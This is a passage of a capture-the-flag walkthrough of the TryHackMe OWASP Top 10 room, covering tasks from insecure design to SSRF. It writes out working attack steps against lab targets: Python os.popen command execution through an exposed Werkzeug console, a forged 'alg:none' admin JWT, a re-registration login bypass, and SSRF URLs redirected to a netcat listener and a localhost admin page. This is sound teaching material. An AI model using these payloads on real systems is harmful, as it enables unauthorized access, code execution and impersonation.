<p><img alt="Insecure Design Password Reset" src="../../../assets/images/thm/owasptop10_2021/18-insecure_design_reset.png" /></p>
<p>During the password reset stage, we are given a choice of security questions. One of the questions asks us to provide an answer to the user's (<em>joseph</em>) favourite colour. We also notice while trying to guess the answer that rate-limiting on failed attempts is not implemented. This means that we can brute-force the answer without getting locked in. Trying different primary colours as an answer we find that the answer <em>green</em> successfully resets the user's password (Password reset to: <code>9B6sDKvcr47fXF</code>).</p>
<p><img alt="Insecure Design Password Reset Success" src="../../../assets/images/thm/owasptop10_2021/19-insecure_design_success.png" /></p>
<p>We can now log into the user account with the credentials <code>joseph:9B6sDKvcr47fXF</code> to retrieve the flag.</p>
<p><img alt="Insecure Design Flag" src="../../../assets/images/thm/owasptop10_2021/20-insecure_design_flag.png" /></p>
<h2 id="task-12-security-misconfiguration">Task 12 - Security Misconfiguration<a class="headerlink" href="#task-12-security-misconfiguration" title="Permanent link">&para;</a></h2>
<p>Security misconfigurations are distinct from other Top 10 vulnerabilities because they occur due to misconfigured security settings (purposefully or inadvertently). An application may be vulnerable if the application is:
- Missing appropriate security hardening across any part of the application stack or improperly configured permissions on cloud services.
- Unnecessary features are enabled or installed (ie: unnecessary ports, services, pages, accounts, or privileges).
- Default accounts and their passwords are still enabled and unchanged.
- Error handling reveals stack traces or other overly informative error messages to users.
- Latest security features are disabled or not configured securely.
- Not using HTTP security headers.
- The software is out of date or vulnerable.</p>
<p>To prevent vulnerabilities arising from security misconfigurations, secure installation processes should be implemented, including:
- A repeatable hardening process.
- A minimal platform without any unnecessary features, components, documentation, and samples.
- A task to review and update the configurations appropriately.
- Review cloud storage permissions.
- A segmented application architecture providing effective and secure separation.
- Sending security directives to clients (ie: security headers).
- An automated process to verify the effectiveness of the configurations and settings in all environments.</p>
<p>A common security misconfiguration involves the exposure of debugging features in production software. Debugging features are often available in programming frameworks to allow the developer to access advanced functionality that is useful for debugging an application during the development and testing cycle. Let's look at a practical example of a web application running a <em>Werkzeug</em> console. Werkzeug is a key component in Python-based web applications as it provides an interface for web servers to execute the Python code. Werkzeug includes a debug console that can be accessed either via URL on <code>/console</code> (or if an exception is raised by the application). In both cases, the console provides a Python console that will run any code a user sends to it.</p>
<p>Opening the URL provided by the task and navigating to <code>/console</code>, we are presented with a <em>Werkzeug</em> console.</p>
<p><img alt="Werkzeug Console" src="../../../assets/images/thm/owasptop10_2021/21-security_misconfig_console.png" /></p>
<p>Using the following code, we can get the console to execute system command (command injection) such as <code>ls -l</code> to list directory contents:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kn">import</span> <span class="nn">os</span><span class="p">;</span> <span class="nb">print</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&quot;ls -l&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</code></pre></div>
<img alt="Security Misconfiguration Command Injection" src="../../../assets/images/thm/owasptop10_2021/22-security_misconfig_ls.png" /></p>
<p>We can modify the above code to read the contents of the <em>app.py</em> file to retrieve the source code and the flag.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kn">import</span> <span class="nn">os</span><span class="p">;</span> <span class="nb">print</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&quot;cat app.py&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</code></pre></div>
<img alt="Security Misconfiguration Flag" src="../../../assets/images/thm/owasptop10_2021/23-security_misconfig_flag.png" /></p>
<h2 id="task-13-vulnerable-and-outdated-components">Task 13 - Vulnerable and Outdated Components<a class="headerlink" href="#task-13-vulnerable-and-outdated-components" title="Permanent link">&para;</a></h2>
<p>Vulnerable and outdated components are software components that are no longer being supported by the developer (deprecated features, libraries, APIs, etc.). Often times, a component has known vulnerabilities that don't get fixed due to lack of resources. Applications often become vulnerable to attacks because they use outdated software components with known security vulnerabilities.</p>
<p>Some key ways vulnerabilities can appear in applications when using vulnerable or outdated components are as follows:
- If you don't know the versions of all components you use (including nested dependencies).
- If the software is vulnerable, unsupported, or out of date.
- If you do not scan for vulnerabilities regularly and subscribe to security bulletins related the component in use.
- If you do not fix, patch, or upgrade the underlying platform, framework, and dependencies in a risk-based timely manner.
- If software developers do not test the compatibility of updated, upgraded, or patched libraries.
- If you do not secure the components' configurations.</p>
<p>Methods to prevent vulnerabilities arising from outdated components are as follows:
- Remove unused dependencies, unnecessary features, components, files, and documents.
- Continuously inventory the versions of both client-side and server-side components and their dependencies.
- Only obtain components from official sources over secure channels.
- Monitor for libraries and components that are unmaintained or do not create security patches for older versions.</p>
<h2 id="task-14-vulnerable-and-outdated-components-exploits">Task 14 - Vulnerable and Outdated Components - Exploits<a class="headerlink" href="#task-14-vulnerable-and-outdated-components-exploits" title="Permanent link">&para;</a></h2>
<p>Key to determining vulnerabilities in applications is recon and enumeration. Our main job is to find out information on the software and research it until we can find an exploit for any vulnerabilities identified. A good resource for finding exploits is <a href="https://www.exploit-db.com/">Exploit-DB</a> or automated scripts such as <a href="https://github.com/jondonas/linux-exploit-suggester-2">Linux Exploit Suggester</a>.</p>
<h2 id="task-15-vulnerable-and-outdated-components-lab">Task 15 - Vulnerable and Outdated Components - Lab<a class="headerlink" href="#task-15-vulnerable-and-outdated-components-lab" title="Permanent link">&para;</a></h2>
<p>In this task, we will be looking at an example. We are presented with a URL for a vulnerable web application. Clicking on the URL presents us with a CSE bookstore website make using PHP with MySQL.</p>
<p>Looking through the source code, we don't see anything unusual. We do notice that at the there is an <em>Admin Login</em> page located at <code>/admin.php</code>. Searching for <em>book store 1.0</em> on Exploit-DB, we find several exploits.</p>
<p><img alt="CSE Bookstore Exploit-DB" src="../../../assets/images/thm/owasptop10_2021/24-vulnerable_components_exploit.png" /></p>
<p>Since the task requires us to find the contents of the <code>/opt/flag.txt</code> file, we will require an exploit that does a remote code execution.</p>
<p><img alt="CSE Bookstore RCE Exploit" src="../../../assets/images/thm/owasptop10_2021/25-vulnerable_components_rce.png" /></p>
<p>The above exploit creates a shell. Let's download and execute the exploit.</p>
<p><img alt="CSE Bookstore Shell" src="../../../assets/images/thm/owasptop10_2021/26-vulnerable_components_shell.png" /></p>
<p>With the shell created, we can now get the contents of the flag from the <code>/opt/flag.txt</code> file.</p>
<p><img alt="CSE Bookstore Flag" src="../../../assets/images/thm/owasptop10_2021/27-vulnerable_components_flag.png" /></p>
<h2 id="task-16-identification-and-authentication-failures">Task 16 - Identification and Authentication Failures<a class="headerlink" href="#task-16-identification-and-authentication-failures" title="Permanent link">&para;</a></h2>
<p>Authentication and session management makeup core components of modern web applications. Authentication controls allow users to gain access to resources by verifying their identities. The most common method of authentication via the username and password mechanism. In this type of a system, a user will provide their credentials to the server which in turn would verify the user's identity and provide the user's browser with a session cookie. A session cookie is needed because web servers use HTTP(S) to communicate which are stateless in nature. Attacking session cookies means the server will know who is sending what data.</p>
<p>Authentication weaknesses can arise in applications if the application:
- Permits automated attacks such as credential stuffing where the attacker has a list of valid usernames and passwords.
- Permits brute force or other automated attacks.
- Permits default, weak, or well-known passwords.
- Uses weak or ineffective credential recovery and forgot-password processes such as "knowledge-based" answers which cannot be made safe.
- Uses plain text, encrypted, or weakly hashed password data stores.
- Has missing or ineffective multi-factor authentication.
- Exposes session identifier in the URL.
- Reuse session identifier after successful login.
- Does not correctly invalidate Session IDs.</p>
<p>Some methods to prevent weaknesses in authentication systems are:
- Implement multi-factor authentication where possible. This prevents automated credential stuffing, brute force, and stolen credential reuse attacks.
- Do not use any default credentials.
- Implement weak password checks.
- Limit or increasingly delay failed login attempts. Log all failures and alert administrators. 
- Use server-side, secure, built-in session manager that generates a new random session ID with high entropy after login.</p>
<h2 id="task-17-identification-and-authentication-failures-practical">Task 17 - Identification and Authentication Failures Practical<a class="headerlink" href="#task-17-identification-and-authentication-failures-practical" title="Permanent link">&para;</a></h2>
<p>In this example, we will look at logic flaw within an authentication mechanism. We are told that the application is vulnerable to an exploit which allows re-registration of an existing user. Furthermore, we are told that the developer of the application did not implement input sanitization for the username and password fields.</p>
<p>The task provides us with a URL for the vulnerable app and asks us to access the user <em>darren</em> account. Since we know that the application is vulnerable to re-registration attacks, we can create a new user account but with an extra space in the front: <code>darren</code> with password <code>pass123</code></p>
<p><img alt="Authentication Failure Re-Registration" src="../../../assets/images/thm/owasptop10_2021/28-auth_account.png" /></p>
<p>With our user created successfully, we can now login with the credentials <code>darren:pass123</code>. Note the space in front of our new user. Due to the flawed logic implemented by the authentication verification check on the backend, the server will verify our new user as <code>darren</code> instead.</p>
<p><img alt="Authentication Failure Darren's Flag" src="../../../assets/images/thm/owasptop10_2021/29-auth_darren_flag.png" /></p>
<p>We are not asked to try the same method with the user <em>arthur</em>. Let's register a new user with the credentials <code>arthur:pass123</code>. Note the space in front of the new username. After successful registration, log in and retrieve the flag for the user <code>arthur</code>.</p>
<p><img alt="Authentication Failure Arthur's Flag" src="../../../assets/images/thm/owasptop10_2021/30-auth_arthur_flag.png" /></p>
<h2 id="task-18-software-and-data-integrity-failures">Task 18 - Software and Data Integrity Failures<a class="headerlink" href="#task-18-software-and-data-integrity-failures" title="Permanent link">&para;</a></h2>
<p>Software and data integrity failures result from code and infrastructure that do no protect against integrity violations. One of the more common data integrity issues arise in situations when users or applications download updates for existing software. Without having a secure CI/CD pipeline with sufficient integrity verification, it is difficult to be certain that the data wasn't modified in transit or that the data is a malicious copy of the original.</p>
<p>To circumvent these issues, most software distributors provide hashes to check a file's integrity. Users can recalculate hashes for their downloaded files and compare the local hash with the one published by the developer. In Linux, hashes can be calculated as follows:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="gp">$ </span>md5sum<span class="w"> </span>&lt;file_name&gt;
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="gp">$ </span>sha1sum<span class="w"> </span>&lt;file_name&gt;
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="gp">$ </span>sha256sum<span class="w"> </span>&lt;file_name&gt;
</code></pre></div>
There are two types of vulnerabilities in this category:
- Software Integrity Failures
- Data Integrity Failures</p>
<h2 id="task-19-software-integrity-failures">Task 19 - Software Integrity Failures<a class="headerlink" href="#task-19-software-integrity-failures" title="Permanent link">&para;</a></h2>
<p>Suppose you develop an website which uses third-party libraries that are stored remotely in some external server that out of your control (ie: jQuery). When a user accesses your website, their browser will read the HTML code and download the third-party library from the specified external source. </p>
<p>Now consider an attacker who is able to either intercept the download of the library (MTIM) and inject a malicious payload or somehow is able to hack the remote server and replace the original with a malicious copy of the library. Anyone visiting your website would now be accessing the malicious code and execute it in their browsers unknowingly. This is a software integrity failure as the website makes no checks against the third-party library to see if it has changed.</p>
<p>Lucky for us, modern browsers provide the capability to specify a hash along with a library's URL so that the library code is executed only if the hash of the downloaded file matches the expected value. This security mechanism is called <a href="https://www.srihash.org/">Subresource Integrity (SRI)</a>.</p>
<h2 id="task-20-data-integrity-failures">Task 20 - Data Integrity Failures<a class="headerlink" href="#task-20-data-integrity-failures" title="Permanent link">&para;</a></h2>
<p>When a user logs into an application, the server will assign some sort of session token that will need to be saved locally on the user's browser for as long as the server lasts. This token is then repeated on each subsequent web request so that the application knows who is making the requests. The most common way these session tokens are assigned is through the use of cookies. Cookies are key-value pairs that a web application will store on the user's browser and will be automatically repeated on each web request to the website by the user.</p>
<p>Developers often use existing token implementations with one of the more popular recently being the JSON Web Tokens (JWT). JWT are simple tokens that allow storage of key-value pairs on a token that provides integrity as part of the token. A generated token can be shared with the user with the certainty that the end-user would not be able to alter the key-value pairs and still pass the integrity check. The structure of a JWT token is formed of 3 parts:</p>
<p><img alt="Data Integrity JWT" src="../../../assets/images/thm/owasptop10_2021/31-data_integrity_jwt.png" /></p>
<p>In the above example, the header portion of the JWT token contains metadata indicating that this is a JWT with a signing algorithm of HS256. The payload contains the key-value pairs with the data that the web application wants the client to store. The signature is similar to a hash. If a user changes the payload, the web application can verify that the signature won't match the payload and know that the JWT has been tampered with. Unlike simple hash, this signature involves the use of a secret key held by the server alone. This means that by simply changing the payload, an attacker won't be able to generate the matching signature unless they know the secret key.</p>
<p>Note that each of the three parts of JWT token are simply plaintext encoded with base64. The signature contains binary data which won't make much sense even after decoding the base64.</p>
<h4 id="jwt-and-the-none-algorithm">JWT and the None Algorithm<a class="headerlink" href="#jwt-and-the-none-algorithm" title="Permanent link">&para;</a></h4>
<p>A while ago, a data integrity failure vulnerability was found in some libraries implementing JWT tokens. The vulnerable libraries allowed attackers to bypass the signature validation by changing the following parameters in a JWT token:
1. Modify the header so that the <code>alg</code> parameter contained the value <code>none</code>.
2. Remove the signature part.</p>
<p>This permitted attackers, to modify the JWT tokens and bypass signature verification checks. Let's see this in practice.</p>
<p>Navigating to the URL provided and authenticating with the credentials <code>guest:guest</code>, we are logged into the web application. After the successful login, we notice in our browser's developer tools that a JWT token has been assigned to us and is stored as a cookie.</p>
<p><img alt="Data Integrity Cookie" src="../../../assets/images/thm/owasptop10_2021/32-data_integrity_cookie.png" /></p>
<p>We can copy the JWT token and decode it to see the plaintext header and payload.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjg1MTI0NzQ5fQ.mrBUgRYiNh-uV8I_ZVY9CrNu4Q2HYoI_Kj0sKMqVlXM
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;}{&quot;username&quot;:&quot;guest&quot;,&quot;exp&quot;:1685124749}    Hb#a_eV=
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>n
<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>b
<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>K
<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>2e\
</code></pre></div>
Let's modify the token above by modifying the <code>alg</code> parameter to have the value <code>none</code> and removing the signature part of the token.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;none&quot;}{&quot;username&quot;:&quot;admin&quot;,&quot;exp&quot;:1685124749}
</code></pre></div>
We can now re-encode the token as base64. I had to encode the header and payload separately as doing it together did not produce the correct encoded value. Note that the header, payload, and signature fields need to be separated by a <code>.</code> in order for it to be interpreted as a valid JWT token.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjg1MTI0NzQ5fQ==.
</code></pre></div>
Updating the cookie value in our browser with our modified token and doing a hard refresh of the web application (CTRL + R), we are able to bypass authentication check for the <em>admin</em> user and retrieve the flag.</p>
<p><img alt="Data Integrity Flag" src="../../../assets/images/thm/owasptop10_2021/34-data_integrity_flag.png" /></p>
<h2 id="task-21-security-logging-and-monitoring">Task 21 - Security Logging and Monitoring<a class="headerlink" href="#task-21-security-logging-and-monitoring" title="Permanent link">&para;</a></h2>
<p>Good security practices dictate that when web applications are set up and deployed, every action performed by an end-user should be logged. Logging is helpful when performing incidence response and threat detection as an attackers activities can be traced. Without logging and monitoring, breaches cannot be detected. Typical information stored in logs should include the following:
- HTTP status codes
- Time stamps
- Usernames
- API endpoint/page locations
- IP addresses</p>
<p>As these types of logs have sensitive information, it is important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations. As logging is useful in DFIR situations, analysts need to be on the lookout for common examples of suspicious activities like
- Multiple unauthorized attempts for a particular action.
- Requests from anomalous IP addresses or locations.
- Use of automated tools.
- Common payloads.</p>
<p>All suspicious activities should be rated according to the impact level.</p>
<h2 id="task-22-server-side-request-forgery-ssrf">Task 22 - Server-Side Request Forgery (SSRF)<a class="headerlink" href="#task-22-server-side-request-forgery-ssrf" title="Permanent link">&para;</a></h2>
<p>SSRF vulnerabilities arise when an attacker forces a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. These vulnerabilities are typical for implementations where web applications need to use third-party services.</p>
<p>In general, SSRF can be used for:
- Enumerating internal networks, including IP addresses and ports (even when protected by firewalls and VPNs).
- Abuse trust relationships between servers and gain access to otherwise restricted services.
- Interact with some non-HTTP services to get RCEs.</p>
<p>See the task material on TryHackMe for an in depth example.</p>
<p>Let's look a simple example of SSRF vulnerability. Navigating to the URL provided, we find a simple web application which is vulnerable to SSRF. Exploring the website, we find an admin interface which is only accessible from localhost.</p>
<p><img alt="SSRF Admin Interface" src="../../../assets/images/thm/owasptop10_2021/35-ssrf_admin.png" /></p>
<p>Looking at link for the <em>Download Resume</em> button, we see that the server parameter points to <code>secure-filestorage.com</code>. As the server parameter is exposed to the user, we can employ SSRF to send to request to our machine.</p>
<p><img alt="SSRF Server" src="../../../assets/images/thm/owasptop10_2021/36-ssrf_server.png" /></p>
<p>Let's start by setting up <em>Netcat</em> listener on port 80 to intercept the request.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="go">nc -lvp 80</span>
</code></pre></div>
We can now force the web application to forward the request to our machine by modifying the server and port parameter in the URL.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>http://10.10.130.112:8087/download?server=10.13.17.49:80&amp;id=75482342
</code></pre></div>
We can retrieve the flag from the captured response.</p>
<p><img alt="SSRF Flag" src="../../../assets/images/thm/owasptop10_2021/37-ssrf_flag.png" /></p>
<h4 id="going-the-extra-mile">Going the Extra Mile<a class="headerlink" href="#going-the-extra-mile" title="Permanent link">&para;</a></h4>
<p>In order to get the flag for the going the extra mile, we need to point the server address to <code>localhost</code>. The URL for the download request button is constructed in the following way:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>http://10.10.203.80:8087/download?server=secure-file-storage.com:8087&amp;id=75482342
</code></pre></div>
The <code>?</code> after <code>/download</code> denotes a separator and does not form part of the <a href="https://en.wikipedia.org/wiki/Query_string">query string</a> of the multiple query parameters <code>server=</code> and <code>id</code>. Note that the multiple query parameters are separated by <code>&amp;</code> in the URL. The query string parameters dictate the content to show on the page. In our case, the web application is looking for two strings, <em>server</em> and <em>id</em>. The web application returns an error if one of the key-value pairs is missing or malformed. We can notice this by putting a random value of <code>id=test</code>. The following segment of code is returned as part of the error page:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a> <span class="n">file_id</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>    <span class="n">server</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;server&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>    <span class="k">if</span> <span class="n">file_id</span><span class="o">!=</span><span class="s1">&#39;&#39;</span><span class="p">:</span>
<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>        <span class="n">filename</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">file_id</span><span class="p">))</span> <span class="o">+</span> <span class="s1">&#39;.pdf&#39;</span>
<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>        <span class="n">response_buf</span> <span class="o">=</span> <span class="n">BytesIO</span><span class="p">()</span>
<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>        <span class="n">crl</span> <span class="o">=</span> <span class="n">pycurl</span><span class="o">.</span><span class="n">Curl</span><span class="p">()</span>
<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>        <span class="n">crl</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">crl</span><span class="o">.</span><span class="n">URL</span><span class="p">,</span> <span class="n">server</span> <span class="o">+</span> <span class="s1">&#39;/public-docs-k057230990384293/&#39;</span> <span class="o">+</span> <span class="n">filename</span><span class="p">)</span>
<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>        <span class="n">crl</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">crl</span><span class="o">.</span><span class="n">WRITEDATA</span><span class="p">,</span> <span class="n">response_buf</span><span class="p">)</span>
</code></pre></div>
<p>Note that the web application is running a Python interpreter in the background.</p>
<p>We can modify the URL to point to <code>server=localhost:8087/admin</code>. However this causes the page to hang as the requested resource is not available. The resultant URL in the backend based on the above code would be as follows:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>http://localhost:8087/admin/public-docs-k057230990384293/75482342.pdf
</code></pre></div>
We can bypass this and access the <code>/admin</code> page by using appending <code>?a=</code> to our server value. This results in the following URL being formed by the backend code:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>http://localhost:8087/admin?a=/public-docs-k057230990384293/id=75482342
</code></pre></div>
Our resultant URL query to trigger SSRF is as follows:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>http://10.10.203.80:8087/download?server=localhost:8087/admin?a=&amp;id=75482342
</code></pre></div>
<p><img alt="SSRF Extra Mile" src="../../../assets/images/thm/owasptop10_2021/38-ssrf_extra_mile.png" /></p>







  
    
  
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">November 27, 2024</span>
  </span>

    
    
    
    
  </aside>





                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
    
      
      <nav class="md-footer__inner md-grid" aria-label="Footer" >
        
          
          <a href="../owaspjuiceshop/" class="md-footer__link md-footer__link--prev" aria-label="Previous: OWASP Juice Shop">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Previous
              </span>
              <div class="md-ellipsis">
                OWASP Juice Shop
              </div>
            </div>
          </a>
        
        
          
          <a href="../picklerick/" class="md-footer__link md-footer__link--next" aria-label="Next: Pickle Rick">
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Next
              </span>
              <div class="md-ellipsis">
                Pickle Rick
              </div>
            </div>
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
            </div>
          </a>
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      &copy; 2024 Nouman Noor
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://github.com/nanoor" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://ca.linkedin.com/in/nouman-noor-60193727" target="_blank" rel="noopener" title="ca.linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
